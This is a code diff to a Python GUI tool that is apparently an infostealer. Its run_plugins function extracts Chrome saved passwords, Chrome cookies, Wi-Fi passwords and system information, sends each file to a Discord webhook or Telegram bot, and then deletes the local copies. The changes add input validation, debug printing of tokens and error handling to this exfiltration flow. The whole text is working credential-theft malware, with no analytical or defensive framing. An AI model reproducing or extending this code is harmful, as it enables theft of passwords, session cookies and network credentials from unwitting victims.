@@ -101,39 +101,67 @@ def run_plugins():
         status_label.config(text="Status: Error")
         return
 
+    discord_webhook = discord_webhook_entry.get()
+    telegram_bot_token = telegram_bot_token_entry.get()
+    telegram_chat_id = telegram_chat_id_entry.get()
+
+    if not discord_webhook and not (telegram_bot_token and telegram_chat_id):
+        messagebox.showerror("Input Error", "Please provide either a Discord Webhook URL or Telegram Bot Token and Chat ID.")
+        status_label.config(text="Status: Waiting")
+        return
+
+    if not (system_info_var.get() or passwords_var.get() or cookies_var.get() or wifi_passwords_var.get()):
+        messagebox.showerror("Selection Error", "Please select at least one option to extract.")
+        status_label.config(text="Status: Waiting")
+        return
+
     set_env_variables()
+    # Debug: Print environment variables
+    print("Environment Variables after setting:")
+    print("DISCORD_WEBHOOK_URL:", os.getenv('DISCORD_WEBHOOK_URL'))
+    print("TELEGRAM_BOT_TOKEN:", os.getenv('TELEGRAM_BOT_TOKEN'))
+    print("TELEGRAM_CHAT_ID:", os.getenv('TELEGRAM_CHAT_ID'))
 
     discord_webhook_url = env_manager.get_env_variable('DISCORD_WEBHOOK_URL')
     telegram_bot_token = env_manager.get_env_variable('TELEGRAM_BOT_TOKEN')
     telegram_chat_id = env_manager.get_env_variable('TELEGRAM_CHAT_ID')
 
-    if system_info_var.get():
-        info_file_path = get_computer_information()
-        if discord_webhook_url:
-            send_file_to_discord(info_file_path, "Computer Information")
-        if telegram_bot_token and telegram_chat_id:
-            send_file_to_telegram(info_file_path, "Computer Information")
+    try:
+        if system_info_var.get():
+            info_file_path = get_computer_information()
+            if info_file_path:
+                if discord_webhook_url:
+                    send_file_to_discord(info_file_path, discord_webhook_url,"Computer Information")
+                if telegram_bot_token and telegram_chat_id:
+                    send_file_to_telegram(info_file_path, telegram_bot_token, telegram_chat_id, "Computer Information")
 
-    if passwords_var.get():
-        extract_chrome_password()
-        if discord_webhook_url:
-            send_file_to_discord(password_file_path, "Chrome Passwords")
-        if telegram_bot_token and telegram_chat_id:
-            send_file_to_telegram(password_file_path, "Chrome Passwords")
+        if passwords_var.get():
+            password_file_path = extract_chrome_password()
+            if password_file_path:
+                if discord_webhook_url:
+                    send_file_to_discord(password_file_path, discord_webhook_url, "Chrome Passwords")
+                if telegram_bot_token and telegram_chat_id:
+                    send_file_to_telegram(password_file_path,telegram_bot_token, telegram_chat_id, "Chrome Passwords")
 
-    if cookies_var.get():
-        extract_chrome_cookie()
-        if discord_webhook_url:
-            send_file_to_discord(cookies_file_path, "Chrome Cookies")
-        if telegram_bot_token and telegram_chat_id:
-            send_file_to_telegram(cookies_file_path, "Chrome Cookies")
+        if cookies_var.get():
+            cookies_file_path = extract_chrome_cookie()
+            if cookies_file_path:
+                if discord_webhook_url:
+                    send_file_to_discord(cookies_file_path, discord_webhook_url, "Chrome Cookies")
+                if telegram_bot_token and telegram_chat_id:
+                    send_file_to_telegram(cookies_file_path, telegram_bot_token, telegram_chat_id, "Chrome Cookies")
 
-    if wifi_passwords_var.get():
-        wifi_profiles_and_passwords()
-        if discord_webhook_url:
-            send_file_to_discord(wifi_passwords_file, "Wi-Fi Passwords")
-        if telegram_bot_token and telegram_chat_id:
-            send_file_to_telegram(wifi_passwords_file, "Wi-Fi Passwords")
+        if wifi_passwords_var.get():
+            wifi_passwords_file = wifi_profiles_and_passwords()
+            if wifi_passwords_file:
+                if discord_webhook_url:
+                    send_file_to_discord(wifi_passwords_file, discord_webhook_url, "Wi-Fi Passwords")
+                if telegram_bot_token and telegram_chat_id:
+                    send_file_to_telegram(wifi_passwords_file, telegram_bot_token, telegram_chat_id, "Wi-Fi Passwords")
+    except Exception as e:
+        messagebox.showerror("Error", f"An error occurred: {e}")
+        status_label.config(text="Status: Error")
+        return
 
     delete_files()
     status_label.config(text="Status: Completed")
